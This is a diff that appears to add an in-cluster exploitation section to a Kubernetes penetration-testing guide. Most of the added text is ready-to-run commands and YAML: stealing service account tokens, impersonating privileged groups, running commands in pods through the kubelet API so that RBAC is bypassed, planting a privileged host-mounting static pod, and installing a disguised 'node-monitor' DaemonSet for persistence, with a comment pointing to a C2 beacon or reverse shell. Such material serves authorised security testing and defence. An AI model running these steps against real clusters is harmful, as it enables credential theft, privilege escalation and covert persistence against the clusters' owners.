@@ -221,3 +221,237 @@ kubectl get pods -o json | jq '.items[].spec.containers[].image' | grep ':latest
 ## Summary
 
 Kubernetes security failures typically chain: a single misconfigured role binding or missing network policy enables lateral movement, which leads to secret extraction, which leads to cloud credential access. Test the chain, not just individual findings. Start from the auth context you have, enumerate what it can reach, and escalate methodically.
+
+## Attack-Chain Additions (in-cluster exploitation)
+
+## Phase 2: Service Account Token Theft and Abuse
+
+### Discovering Tokens
+
+```bash
+# Default service account token mount
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+# Projected service account tokens (newer clusters)
+ls /var/run/secrets/kubernetes.io/serviceaccount/
+# Files: token, ca.crt, namespace
+
+# Search for tokens in environment variables and config files
+env | grep -i token
+find / -name "kubeconfig" -o -name ".kube" -o -name "config" 2>/dev/null
+find / -name "*.kubeconfig" 2>/dev/null
+
+# Check mounted secrets in other pods (if you can list or exec)
+kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}: {range .spec.volumes[*]}{.secret.secretName} {end}{"\n"}{end}'
+
+# Look for tokens in etcd, configmaps, or environment variables
+kubectl get secrets -A
+kubectl get configmaps -A -o yaml | grep -i token
+```
+
+### Token Impersonation
+
+```bash
+# Use a stolen token to authenticate
+kubectl --token="$STOLEN_TOKEN" --server="$APISERVER" \
+  --certificate-authority="$CACERT" auth can-i --list
+
+# Impersonate a service account (requires impersonate verb)
+kubectl auth can-i impersonate serviceaccounts
+kubectl --as=system:serviceaccount:kube-system:default get secrets -n kube-system
+
+# Impersonate a user
+kubectl --as=admin@example.com get pods -A
+
+# Impersonate a group
+kubectl --as-group=system:masters --as=dummy get secrets -A
+```
+
+---
+
+## Phase 4: Kubelet API Exploitation
+
+### Accessing Kubelet Directly
+
+```bash
+# Kubelet API runs on port 10250 (authenticated) and 10255 (read-only, deprecated)
+# Scan for kubelet ports across cluster nodes
+
+# Read-only port (10255) - no auth required if exposed
+curl -s http://NODE_IP:10255/pods | python3 -m json.tool
+curl -s http://NODE_IP:10255/spec/
+curl -s http://NODE_IP:10255/metrics
+
+# Authenticated port (10250) - requires valid credentials
+# Use service account token or client certificate
+curl -sk https://NODE_IP:10250/pods \
+  -H "Authorization: Bearer ${TOKEN}"
+
+# List running pods on the node
+curl -sk https://NODE_IP:10250/runningpods/ \
+  -H "Authorization: Bearer ${TOKEN}"
+```
+
+### Command Execution via Kubelet
+
+```bash
+# kubeletctl tool for kubelet API interaction
+kubeletctl -s NODE_IP pods
+kubeletctl -s NODE_IP scan rce
+
+# Execute commands in pods via kubelet API directly (bypasses API server RBAC)
+curl -sk https://NODE_IP:10250/run/NAMESPACE/POD_NAME/CONTAINER_NAME \
+  -H "Authorization: Bearer ${TOKEN}" \
+  -d "cmd=id"
+
+# Execute in every container on the node
+curl -sk https://NODE_IP:10250/runningpods/ \
+  -H "Authorization: Bearer ${TOKEN}" | \
+  python3 -c "
+import json,sys
+pods=json.load(sys.stdin)
+for pod in pods.get('items',[]):
+    ns=pod['metadata']['namespace']
+    name=pod['metadata']['name']
+    for c in pod['spec'].get('containers',[]):
+        print(f'{ns}/{name}/{c[\"name\"]}')
+"
+# Then exec into each one to extract tokens and secrets
+
+# Retrieve container logs
+curl -sk "https://NODE_IP:10250/containerLogs/NAMESPACE/POD/CONTAINER" \
+  -H "Authorization: Bearer ${TOKEN}"
+```
+
+---
+
+## Phase 8: Admission Controller Bypass and Persistence
+
+### Bypassing Admission Controllers
+
+```bash
+# Check which admission controllers are active
+kubectl get validatingwebhookconfigurations
+kubectl get mutatingwebhookconfigurations
+
+# Inspect webhook configuration for bypass opportunities
+kubectl get validatingwebhookconfigurations -o json | python3 -c "
+import json,sys
+data=json.load(sys.stdin)
+for wh in data['items']:
+    name=wh['metadata']['name']
+    for w in wh.get('webhooks',[]):
+        ns_selector=w.get('namespaceSelector',{})
+        obj_selector=w.get('objectSelector',{})
+        failure=w.get('failurePolicy','Fail')
+        print(f'{name}/{w[\"name\"]}: failurePolicy={failure}')
+        if ns_selector:
+            print(f'  namespaceSelector: {json.dumps(ns_selector)}')
+        if failure == 'Ignore':
+            print(f'  BYPASS: failurePolicy=Ignore - webhook failures are ignored')
+"
+
+# If failurePolicy is Ignore, you can create resources when webhook is down
+# If namespaceSelector excludes certain namespaces, deploy there
+
+# Deploy to kube-system (often excluded from admission policies)
+kubectl run pwn --image=alpine -n kube-system -- sleep 3600
+
+# Use static pods (bypass API server admission entirely)
+# Write manifest to /etc/kubernetes/manifests/ on a node
+cat > /host/etc/kubernetes/manifests/pwn.yaml << 'EOF'
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pwn-static
+  namespace: kube-system
+spec:
+  hostPID: true
+  hostNetwork: true
+  containers:
+  - name: pwn
+    image: alpine
+    command: ["sleep", "3600"]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - name: root
+      mountPath: /host
+  volumes:
+  - name: root
+    hostPath:
+      path: /
+EOF
+```
+
+### CRD and Operator Abuse
+
+```bash
+# List custom resource definitions
+kubectl get crds
+
+# Check for operators with elevated privileges
+kubectl get deployments -A -o json | python3 -c "
+import json,sys
+data=json.load(sys.stdin)
+for d in data['items']:
+    name=d['metadata']['name']
+    ns=d['metadata']['namespace']
+    sa=d['spec']['template']['spec'].get('serviceAccountName','default')
+    if any(x in name.lower() for x in ['operator','controller','manager']):
+        print(f'{ns}/{name} (SA: {sa})')
+"
+
+# If you can create CRDs, install a backdoor operator
+# If you can modify existing CRs, inject malicious configurations
+# Example: modify a CR that triggers pod creation with your image
+```
+
+### Persistence via DaemonSet
+
+```bash
+# Deploy a DaemonSet that runs on every node
+cat <<'EOF' | kubectl apply -f -
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: node-monitor
+  namespace: kube-system
+  labels:
+    app: node-monitor
+spec:
+  selector:
+    matchLabels:
+      app: node-monitor
+  template:
+    metadata:
+      labels:
+        app: node-monitor
+    spec:
+      hostPID: true
+      hostNetwork: true
+      tolerations:
+      - operator: Exists
+      containers:
+      - name: monitor
+        image: alpine
+        command: ["/bin/sh", "-c"]
+        args:
+        - |
+          while true; do
+            # Beacon to C2 or maintain reverse shell
+            sleep 3600
+          done
+        securityContext:
+          privileged: true
+        volumeMounts:
+        - name: host
+          mountPath: /host
+      volumes:
+      - name: host
+        hostPath:
+          path: /
+EOF
+```
+
+---
